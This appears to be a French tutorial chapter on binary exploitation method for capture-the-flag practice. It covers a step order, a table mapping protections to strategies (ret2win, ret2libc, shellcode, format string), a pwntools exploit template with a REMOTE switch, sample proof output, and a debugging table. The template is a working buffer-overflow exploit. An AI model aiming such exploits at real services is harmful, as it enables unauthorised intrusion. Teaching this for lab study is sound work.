# 10 — Méthode et gabarit

[← Module](README.md)

## Objectif

Enchaîner les étapes dans le bon ordre, avec un gabarit unique, et disposer d'une table de
diagnostic pour les cas où l'exploit ne marche pas.

## L'ordre des étapes

On ne commence jamais par écrire un payload. On répond d'abord à des questions, dans cet ordre :

1. **Protections** — `pwn checksec`. PIE ? NX ? canary ? RELRO ?
2. **Faille** — débordement, format string, autre. Où, et de combien ?
3. **Offset** — `cyclic` + `gdb`, mesuré sur le binaire final.
4. **Objectif** — appeler une fonction existante, fuiter la libc, écrire en mémoire.
5. **Moyens** — gadgets disponibles (`ROP(elf)`), symboles, GOT.
6. **Exploit** — payload, dialogue, preuve d'exécution.
7. **Rejeu** — même script avec `REMOTE`, sur la cible réelle.

Sauter l'étape 1 coûte une heure : on écrit un ret2win contre un binaire PIE, ou un shellcode
contre un binaire NX.

## Table de décision

| Constat | Stratégie |
| --- | --- |
| `No PIE` + `No canary` + fonction intéressante | ret2win |
| `No PIE` + `NX` + pas de fonction utile | ret2libc avec fuite GOT |
| `NX` désactivé (`Stack: Executable`) | shellcode sur la pile |
| `printf(buf)` | format string |
| `PIE` actif | il faut une fuite avant tout saut absolu |
| `canary` présent | fuite du canary, ou faille qui ne l'écrase pas (format string) |
| `Full RELRO` | la GOT est en lecture seule : viser `__malloc_hook`, `atexit`, ou une structure de contrôle |

## Le gabarit

```python
#!/usr/bin/env python3
"""Exploit — <nom du challenge>.

Usage :
    python3 exploit.py            # local
    python3 exploit.py REMOTE     # cible distante
"""
from pwn import *

context.binary = elf = ELF("./ret2win", checksec=False)
context.log_level = "error"

HOST, PORT = "127.0.0.1", 1337
OFFSET = 72


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript="b vuln\nc")
    return process(elf.path)


def exploit():
    io = start()
    io.recvuntil(b"Entree :\n")

    payload = b"A" * OFFSET + p64(elf.symbols["win"])
    io.send(payload)

    io.sendline(b"echo PWNED; id")
    print(io.recvall(timeout=3).decode(errors="replace"))


if __name__ == "__main__":
    exploit()
```

Trois bascules gratuites : `REMOTE` pour la cible réelle, `GDB` pour observer, et rien pour le
local. C'est ce qui rend l'exploit relisible des mois plus tard.

## Preuves

Un exploit se prouve par une sortie, pas par une absence d'erreur :

```text
Bravo, tu as detourne l'execution !
PWNED
uid=10001(openhands) gid=10001(openhands) groups=10001(openhands),27(sudo)
```

Pour un writeup, garder la commande, la sortie et la version de la libc. Sans la version de la
libc, un ret2libc n'est pas reproductible.

## Diagnostic

| Symptôme | Première hypothèse | Vérification |
| --- | --- | --- |
| `SIGSEGV` au `ret` | adresse de retour fausse | `gdb`, `x/2gx $rsp` au moment du `ret` |
| `SIGSEGV` dans la fonction cible | alignement de pile | insérer un gadget `ret` |
| `SIGILL` | saut au milieu d'une instruction | vérifier l'adresse, `x/2i $pc` |
| Rien ne s'affiche | `recvuntil` sur un motif absent | `context.log_level = "debug"` |
| Shell absent, message affiché | `system` a échoué (mauvaise libc) | comparer la base avec `vmmap` |
| `EOFError` immédiat | le binaire a quitté | relancer avec `gdb` et le payload exact |
| Offset qui « marche une fois sur deux » | ASLR ou course dans le dialogue | `sendlineafter`, et vérifier l'absence de PIE |

## Journal d'un échec réel

Pendant la préparation du chapitre 04, l'exploit shellcode a d'abord renvoyé `SIGILL`. Cause : une
adresse de tampon relevée sous gdb, réutilisée hors gdb, alors que la pile avait bougé à cause des
variables d'environnement. Correction : faire fuiter l'adresse par le binaire lui-même. Leçon : une
adresse de pile relevée dans un contexte ne vaut que dans ce contexte.

## Où s'entraîner

| Plateforme | Intérêt |
| --- | --- |
| [pwn.college](https://pwn.college/) | progression complète, gratuite, avec environnement |
| [ROP Emporium](https://ropemporium.com/) | huit exercices ROP, du ret2win au pivot |
| [picoCTF](https://picoctf.org/) | challenges d'entrée, archives disponibles |
| [Hack The Box](https://www.hackthebox.com/) | machines et challenges pwn |
| [Root-Me](https://www.root-me.org/) | épreuves système et binaire, en français |

## À retenir

- Protections d'abord, payload ensuite.
- Un offset se mesure sur le binaire final, jamais sur le source.
- Un gabarit avec `REMOTE` / `GDB` se réutilise ; un script jetable ne sert qu'une fois.
- Un exploit se prouve par une commande exécutée, et se documente avec la version de la libc.
